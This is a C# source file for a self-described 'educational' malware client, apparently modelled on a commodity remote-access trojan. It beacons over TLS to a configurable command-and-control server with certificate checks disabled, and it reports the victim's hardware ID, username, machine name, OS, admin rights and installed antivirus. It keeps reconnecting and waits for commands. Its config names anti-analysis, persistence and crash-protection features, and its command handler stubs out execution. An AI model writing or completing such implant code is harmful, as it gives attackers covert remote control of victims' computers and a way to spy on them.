// =============================================================================
// CONFIGURABLE MALWARE CLIENT FOR TESTING
// =============================================================================
// This version is configured to connect to YOUR test C2 server
// Change the HOST and PORT below to match your server
// =============================================================================

using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.Devices;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Security.Principal;
using System.Management;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace MalwareClient
{
    // =========================================================================
    // CONFIGURATION - EDIT THESE VALUES
    // =========================================================================
    public static class Config
    {
        // =====================================================
        // CHANGE THIS TO YOUR C2 SERVER'S IP ADDRESS
        // =====================================================
        // If running both on same PC: use "127.0.0.1" or "localhost"
        // If running on different PC: use the C2 server's IP address
        // =====================================================
        
        // EXAMPLES:
        // public static string HOST = "127.0.0.1";        // Same computer
        // public static string HOST = "192.168.1.100";   // Different computer (C2 server IP)
        // public static string HOST = "10.0.0.50";       // Different computer (C2 server IP)
        
        public static string HOST = "127.0.0.1";  // ← CHANGE THIS TO C2 SERVER IP
        
        public static int PORT = 4444;            // ← CHANGE IF NEEDED
        
        // =====================================================
        // BEHAVIOR SETTINGS
        // =====================================================
        public static int DELAY_SECONDS = 1;      // Startup delay (short for testing)
        public static string GROUP = "TestGroup"; // Victim group identifier
        public static bool ENABLE_ANTI_ANALYSIS = false;  // Disable for testing in VM
        public static bool ENABLE_PERSISTENCE = false;    // Disable for testing
        public static bool ENABLE_BSOD_PROTECTION = false; // Disable for testing
    }

    // =========================================================================
    // MALWARE CLIENT PROGRAM
    // =========================================================================
    class Program
    {
        // Connection state
        private static Socket? client;
        private static SslStream? sslStream;
        private static bool isConnected = false;
        private static string hwid = "";
        
        // Hardware ID generation
        private static string GenerateHWID()
        {
            try
            {
                string? pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
                long totalSize = 0;
                if (!string.IsNullOrEmpty(pathRoot))
                {
                    totalSize = new DriveInfo(pathRoot).TotalSize;
                }

                string uniqueData = string.Concat(
                    Environment.ProcessorCount,
                    Environment.UserName,
                    Environment.MachineName,
                    Environment.OSVersion,
                    totalSize
                );

                using MD5 md5 = MD5.Create();
                byte[] bytes = Encoding.ASCII.GetBytes(uniqueData);
                bytes = md5.ComputeHash(bytes);
                StringBuilder sb = new StringBuilder();
                foreach (byte b in bytes)
                {
                    sb.Append(b.ToString("x2"));
                }
                return sb.ToString().Substring(0, 20).ToUpper();
            }
            catch
            {
                return "UNKNOWN-HWID";
            }
        }

        static void Main(string[] args)
        {
            Console.Title = "Malware Client (Educational)";
            
            Console.WriteLine("╔════════════════════════════════════════════════╗");
            Console.WriteLine("║     MALWARE CLIENT - EDUCATIONAL VERSION       ║");
            Console.WriteLine("╚════════════════════════════════════════════════╝");
            Console.WriteLine();
            
            // Generate HWID
            hwid = GenerateHWID();
            
            Console.WriteLine($"[*] Configuration:");
            Console.WriteLine($"    C2 Server: {Config.HOST}:{Config.PORT}");
            Console.WriteLine($"    HWID: {hwid}");
            Console.WriteLine($"    Group: {Config.GROUP}");
            Console.WriteLine($"    User: {Environment.UserName}");
            Console.WriteLine($"    Machine: {Environment.MachineName}");
            Console.WriteLine($"    OS: {Environment.OSVersion}");
            Console.WriteLine($"    Admin: {IsAdmin()}");
            Console.WriteLine();
            
            // Startup delay
            Console.WriteLine($"[*] Waiting {Config.DELAY_SECONDS} second(s) before startup...");
            for (int i = 0; i < Config.DELAY_SECONDS; i++)
            {
                Thread.Sleep(1000);
            }
            
            // Main connection loop
            Console.WriteLine("[*] Starting connection loop...");
            while (true)
            {
                try
                {
                    if (!isConnected)
                    {
                        ConnectToC2();
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Connection error: {ex.Message}");
                }
                
                Thread.Sleep(5000); // Wait 5 seconds before retry
            }
        }

        static bool IsAdmin()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent())
                .IsInRole(WindowsBuiltInRole.Administrator);
        }

        static void ConnectToC2()
        {
            Console.WriteLine($"\n[*] Connecting to C2 server at {Config.HOST}:{Config.PORT}...");
            
            try
            {
                // Create TCP socket
                client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 51200,
                    SendBufferSize = 51200
                };
                
                // Connect to server
                client.Connect(Config.HOST, Config.PORT);
                Console.WriteLine("[+] TCP connection established!");
                
                // Wrap in SSL stream (accept any certificate for testing)
                NetworkStream networkStream = new NetworkStream(client, ownsSocket: true);
                sslStream = new SslStream(networkStream, false, 
                    (sender, certificate, chain, errors) => true); // Accept any cert
                
                sslStream.AuthenticateAsClient(Config.HOST, null, SslProtocols.Tls12, false);
                Console.WriteLine("[+] SSL/TLS connection established!");
                
                isConnected = true;
                
                // Send initial client info
                SendClientInfo();
                
                // Start listening for commands
                ListenForCommands();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Failed to connect: {ex.Message}");
                isConnected = false;
            }
        }

        static void SendClientInfo()
        {
            Console.WriteLine("[*] Sending client information to C2...");
            
            Dictionary<string, string> info = new Dictionary<string, string>
            {
                { "Packet", "ClientInfo" },
                { "HWID", hwid },
                { "User", Environment.UserName },
                { "OS", new ComputerInfo().OSFullName.ToString().Replace("Microsoft", "") + " " + (Environment.Is64BitOperatingSystem ? "64bit" : "32bit") },
                { "Path", Application.ExecutablePath },
                { "Version", "1.0-TEST" },
                { "Admin", IsAdmin() ? "Admin" : "User" },
                { "Antivirus", GetAntivirus() },
                { "Group", Config.GROUP },
                { "Pastebin", "null" },
                { "Installed", DateTime.Now.ToUniversalTime().ToString() },
                { "Pong", "" }
            };
            
            byte[] packet = BuildMessagePack(info);
            SendData(packet);
            
            Console.WriteLine("[+] Client info sent!");
        }

        static string GetAntivirus()
        {
            try
            {
                using ManagementObjectSearcher searcher = new ManagementObjectSearcher(
                    "\\\\" + Environment.MachineName + "\\root\\SecurityCenter2",
                    "Select * from AntivirusProduct");
                
                List<string> avList = new List<string>();
                using ManagementObjectCollection collection = searcher.Get();
                foreach (ManagementBaseObject obj in collection)
                {
                    if (obj["displayName"] != null)
                    {
                        avList.Add(obj["displayName"].ToString() ?? "");
                    }
                }
                return avList.Count > 0 ? string.Join(", ", avList) : "N/A";
            }
            catch
            {
                return "N/A";
            }
        }

        static void ListenForCommands()
        {
            Console.WriteLine("[*] Listening for commands from C2...\n");
            
            while (isConnected && client != null && client.Connected && sslStream != null)
            {
                try
                {
                    byte[]? data = ReceiveData();
                    if (data != null)
                    {
                        ProcessCommand(data);
                    }
                    else
                    {
                        Console.WriteLine("[!] Server disconnected");
                        isConnected = false;
                        break;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error: {ex.Message}");
                    isConnected = false;
                    break;
                }
            }
        }

        static void ProcessCommand(byte[] data)
        {
            try
            {
                byte[] decompressed = Decompress(data);
                Dictionary<string, string> command = DecodeMessagePack(decompressed);
                
                string packetType = command.ContainsKey("Packet") ? command["Packet"] : "Unknown";
                
                Console.WriteLine($"[*] Received command: {packetType}");
                
                switch (packetType)
                {
                    case "ping":
                        // Respond to ping
                        SendPong();
                        break;
                        
                    case "pong":
                        Console.WriteLine($"[*] Pong received");
                        break;
                        
                    case "command":
                        string cmd = command.ContainsKey("Command") ? command["Command"] : "";
                        Console.WriteLine($"[*] Command to execute: {cmd}");
                        // In real malware, this would execute the command
                        SendAck();
                        break;
                        
                    default:
                        Console.WriteLine($"[*] Unknown packet type: {packetType}");
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error processing command: {ex.Message}");
            }
        }

        static void SendPong()
        {
            Console.WriteLine("[*] Sending pong response...");
            
            Dictionary<string, string> response = new Dictionary<string, string>
            {
                { "Packet", "pong" },
                { "Message", "0" }
            };
            
            SendData(BuildMessagePack(response));
        }

        static void SendAck()
        {
            Dictionary<string, string> response = new Dictionary<string, string>
            {
                { "Packet", "Received" }
            };
            
            SendData(BuildMessagePack(response));
        }

        // =========================================================================
        // NETWORK FUNCTIONS
        // =========================================================================

        static void SendData(byte[] data)
        {
            if (sslStream == null || !isConnected) return;
            
            try
            {
                byte[] lengthHeader = BitConverter.GetBytes(data.Length);
                sslStream.Write(lengthHeader, 0, 4);
                sslStream.Write(data, 0, data.Length);
                sslStream.Flush();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Send error: {ex.Message}");
                isConnected = false;
            }
        }

        static byte[]? ReceiveData()
        {
            if (sslStream == null) return null;
            
            try
            {
                // Read 4-byte length
                byte[] lengthBytes = new byte[4];
                int read = sslStream.Read(lengthBytes, 0, 4);
                if (read < 4) return null;
                
                int length = BitConverter.ToInt32(lengthBytes, 0);
                if (length <= 0 || length > 10_000_000) return null;
                
                // Read data
                byte[] buffer = new byte[length];
                int totalRead = 0;
                while (totalRead < length)
                {
                    read = sslStream.Read(buffer, totalRead, length - totalRead);
                    if (read <= 0) return null;
                    totalRead += read;
                }
                
                return buffer;
            }
            catch
            {
                return null;
            }
        }

        // =========================================================================
        // MESSAGEPACK FUNCTIONS
        // =========================================================================

        static byte[] BuildMessagePack(Dictionary<string, string> data)
        {
            using MemoryStream ms = new MemoryStream();
            
            // Simple map format
            ms.WriteByte((byte)(128 + data.Count)); // fixmap
            
            foreach (var kvp in data)
            {
                // Write key
                byte[] keyBytes = Encoding.UTF8.GetBytes(kvp.Key);
                ms.WriteByte((byte)(160 + keyBytes.Length));
                ms.Write(keyBytes, 0, keyBytes.Length);
                
                // Write value
                byte[] valueBytes = Encoding.UTF8.GetBytes(kvp.Value);
                if (valueBytes.Length <= 31)
                {
                    ms.WriteByte((byte)(160 + valueBytes.Length));
                    ms.Write(valueBytes, 0, valueBytes.Length);
                }
                else
                {
                    ms.WriteByte(217); // str8
                    ms.WriteByte((byte)valueBytes.Length);
                    ms.Write(valueBytes, 0, valueBytes.Length);
                }
            }
            
            return Compress(ms.ToArray());
        }

        static Dictionary<string, string> DecodeMessagePack(byte[] data)
        {
            Dictionary<string, string> result = new Dictionary<string, string>();
            
            try
            {
                using MemoryStream ms = new MemoryStream(data);
                byte b = (byte)ms.ReadByte();
                
                if (b >= 128 && b <= 143) // fixmap
                {
                    int count = b - 128;
                    for (int i = 0; i < count; i++)
                    {
                        string key = ReadMsgPackString(ms);
                        string value = ReadMsgPackString(ms);
                        result[key] = value;
                    }
                }
            }
            catch { }
            
            return result;
        }

        static string ReadMsgPackString(Stream ms)
        {
            byte b = (byte)ms.ReadByte();
            int length = 0;
            
            if (b >= 160 && b <= 191)
            {
                length = b - 160;
            }
            else if (b == 217)
            {
                length = ms.ReadByte();
            }
            else if (b == 218)
            {
                byte[] lenBytes = new byte[2];
                ms.Read(lenBytes, 0, 2);
                length = (lenBytes[0] << 8) | lenBytes[1];
            }
            
            if (length > 0)
            {
                byte[] strBytes = new byte[length];
                ms.Read(strBytes, 0, length);
                return Encoding.UTF8.GetString(strBytes);
            }
            
            return "";
        }

        // =========================================================================
        // COMPRESSION
        // =========================================================================

        static byte[] Compress(byte[] data)
        {
            using MemoryStream ms = new MemoryStream();
            ms.Write(BitConverter.GetBytes(data.Length), 0, 4);
            using (GZipStream gzip = new GZipStream(ms, CompressionMode.Compress, leaveOpen: true))
            {
                gzip.Write(data, 0, data.Length);
            }
            return ms.ToArray();
        }

        static byte[] Decompress(byte[] data)
        {
            using MemoryStream ms = new MemoryStream(data);
            byte[] lenBytes = new byte[4];
            ms.Read(lenBytes, 0, 4);
            int length = BitConverter.ToInt32(lenBytes, 0);
            
            using GZipStream gzip = new GZipStream(ms, CompressionMode.Decompress);
            byte[] result = new byte[length];
            gzip.Read(result, 0, length);
            return result;
        }
    }
}
